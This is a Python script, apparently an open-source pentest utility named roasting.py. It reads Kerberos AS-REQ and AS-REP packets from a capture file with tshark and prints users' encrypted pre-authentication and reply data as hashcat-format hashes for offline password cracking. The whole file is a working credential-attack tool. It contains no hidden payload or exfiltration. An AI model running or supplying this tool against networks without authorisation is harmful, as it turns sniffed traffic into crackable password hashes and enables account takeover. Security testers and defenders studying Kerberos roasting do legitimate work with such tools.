"""
MIT License

Copyright (c) 2024 Javier Álvarez

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import sys
import subprocess
from typing import List, Tuple


def parse_asreq_packets(pcap_file: str) -> List[Tuple[str, str, str]]:
    tshark_cmd = [
        "tshark",
        "-r",
        pcap_file,
        "-Y",
        "kerberos.msg_type == 10 && kerberos.CNameString && kerberos.realm && kerberos.cipher",
        "-T",
        "fields",
        "-e",
        "kerberos.CNameString",
        "-e",
        "kerberos.realm",
        "-e",
        "kerberos.cipher",
        "-E",
        "separator=$",
    ]

    result = subprocess.run(tshark_cmd, capture_output=True, text=True, check=True)

    parsed_results = []
    for line in result.stdout.strip().split("\n"):
        if line:
            username, domain, cipher = line.split("$")
            parsed_results.append((username, domain, cipher))

    return parsed_results


def parse_asrep_packets(pcap_file: str) -> List[Tuple[str, str, str, str]]:
    tshark_cmd = [
        "tshark",
        "-r",
        pcap_file,
        "-Y",
        "kerberos.msg_type == 11 && kerberos.CNameString && kerberos.realm && kerberos.cipher",
        "-T",
        "fields",
        "-e",
        "kerberos.CNameString",
        "-e",
        "kerberos.realm",
        "-e",
        "kerberos.cipher",
        "-E",
        "separator=$",
    ]

    result = subprocess.run(tshark_cmd, capture_output=True, text=True, check=True)

    parsed_results = []
    for line in result.stdout.strip().split("\n"):
        if line:
            try:
                username, domain, cipher = line.split("$")
                cipher_parts = cipher.split(",")  # AS-REP packets contain two ciphers: one for the ticket and one for the session key
                if len(cipher_parts) > 1:
                    session_key_cipher = cipher_parts[1]
                    first_16_bytes = session_key_cipher[:32]  # 32 hex chars = 16 bytes
                    remaining_bytes = session_key_cipher[32:]
                    parsed_results.append((username, domain, first_16_bytes, remaining_bytes))
            except:
                continue

    return parsed_results


def main():
    if len(sys.argv) != 3:
        print("Usage: python roasting.py <pcap_file> <as_req/as_rep>", file=sys.stderr)
        sys.exit(1)

    pcap_file = sys.argv[1]
    roast_type = sys.argv[2].lower()

    if roast_type == "as_req":
        fields = parse_asreq_packets(pcap_file)
        for username, domain, cipher in fields:
            print(f"$krb5pa$18${username}${domain}${cipher}")

    elif roast_type == "as_rep":
        fields = parse_asrep_packets(pcap_file)
        for username, domain, first_16, remaining in fields:
            print(f"$krb5asrep$23${username}@{domain}:{first_16}${remaining}")

    else:
        print("Error: Second argument must be either 'as_req' or 'as_rep'", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
